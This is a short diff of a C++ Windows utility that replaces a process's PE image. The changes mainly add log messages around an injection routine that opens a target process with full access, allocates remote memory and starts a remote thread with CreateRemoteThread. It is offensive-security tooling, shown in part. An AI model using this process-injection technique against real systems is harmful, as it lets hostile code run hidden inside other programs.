@@ -11,7 +11,7 @@ bool Override::ReplaceImage(const wchar_t* proc, const wchar_t* newImagePath, bo
 		std::wprintf(L"[-] Unable to open file, is it available/exists ? [-]\n");
 	}
  
-	std::puts("[+] Getting current PID [+]");
+	std::wprintf(L"[+] Getting PID of %s [+]\n", proc);
 	// Get process PID and Start the PE image replace
 	DWORD pid = GetPID(proc);
 	if (!pid) return false;
@@ -20,7 +20,10 @@ bool Override::ReplaceImage(const wchar_t* proc, const wchar_t* newImagePath, bo
 	// Yep, even if self is true we are going to open our own process
 	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, NULL, pid);
 
-	if (!hProc || hProc == INVALID_HANDLE_VALUE) return false;
+	if (!hProc || hProc == INVALID_HANDLE_VALUE) {
+		std::wprintf(L"[-] Unable to open process %s, are you admin ? [-]\n", proc);
+		return false;
+	}
 
 	BasicPE basicPE;
 	if (!basicPE.ParseBuffer(newImage.data)) return false;
@@ -37,14 +40,14 @@ bool Override::ReplaceImage(const wchar_t* proc, const wchar_t* newImagePath, bo
 	// Self code injection
 	if (self)
 	{
-		std::puts("\n\n[+] Parsing IAT, realocations and TLS callbacks [+]\n");
+		std::puts("\n\n[+] Parsing IAT and applying relocations [+]\n");
 		InternalLoader(&iData);
 		return true;
 	}
 
 
 	// Remote code injection
-
+	std::puts("[+] Injecting using CreateRemoteThread technique [+]");
 	RemoteBuffer threadArg(hProc);
 	threadArg.data = reinterpret_cast<LPVOID>(VirtualAllocEx(hProc, NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
 
@@ -62,7 +65,7 @@ bool Override::ReplaceImage(const wchar_t* proc, const wchar_t* newImagePath, bo
 		return false;
 	}
 
-
+	std::puts("[+] Entering in the valley of despair! Expect no logs from now on [+]");
 	HANDLE hThread = CreateRemoteThread(hProc, NULL, 0x1000, (LPTHREAD_START_ROUTINE)threadCode.data, threadArg.data, NULL, NULL);
 
 	if (hThread == INVALID_HANDLE_VALUE)
@@ -70,6 +73,8 @@ bool Override::ReplaceImage(const wchar_t* proc, const wchar_t* newImagePath, bo
 		return false;
 	}
 	
+	// Wait a little to everything be setup 
+	Sleep(SLEEP_TIME);
 	return true;
 }
 
